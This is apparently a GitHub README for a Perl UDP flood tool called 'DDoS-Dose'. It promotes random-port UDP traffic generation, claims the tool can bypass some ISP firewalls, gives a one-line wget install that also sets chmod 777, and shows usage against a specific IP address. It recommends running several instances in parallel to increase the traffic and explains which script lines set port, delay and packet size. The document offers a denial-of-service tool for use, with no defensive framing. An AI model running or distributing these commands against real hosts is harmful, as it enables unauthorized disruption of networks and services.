# Script for DDoS-Dose ! 

## Features

- Generate Random UDP Traffic
- To Random Port
- Require HPC (High Performance Computing) Server
- Can bypass some ISP Firewalls
- Language: Perl
- Spoofed: No (doesn't include IP header Modification)

## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/UDP/random-udp-string%20%7C%20ID%3AA2/random-udp-string.pl && chmod 777 *
```

## Usage

```
perl random-udp-string.pl 162.241.27.65
```
```
YOU CAN RUN IT MULTIPLE TIME TO INCREASE TRAFFIC LIKE - Depends on CPU/RAM
perl random-udp-string.pl 162.241.27.65 & perl random-udp-string.pl 162.241.27.65 & perl random-udp-string.pl 162.241.27.65
---> Multithreading Causing Issue
```
```
- This script pre-configured to send traffic to random port, (Line69) Can be Changed!
- This script pre-configured to send traffic with some delay between packet, (Line74) Can be Changed!
- This script pre-configured to send random packet size, (Line68), Can be changed!
- Can adjust time by "timeout 30" command or check (Line58)
```

## Related

want to pass the Target IP, Packet Size, Packet Count in Command Line

[Click Here for that Script](https://github.com/cyberceros/)

## Authors

- [@cyberceros](https://www.github.com/cyberceros)

## Feedback

If you have any feedback, please reach out to us at n@dultr.in






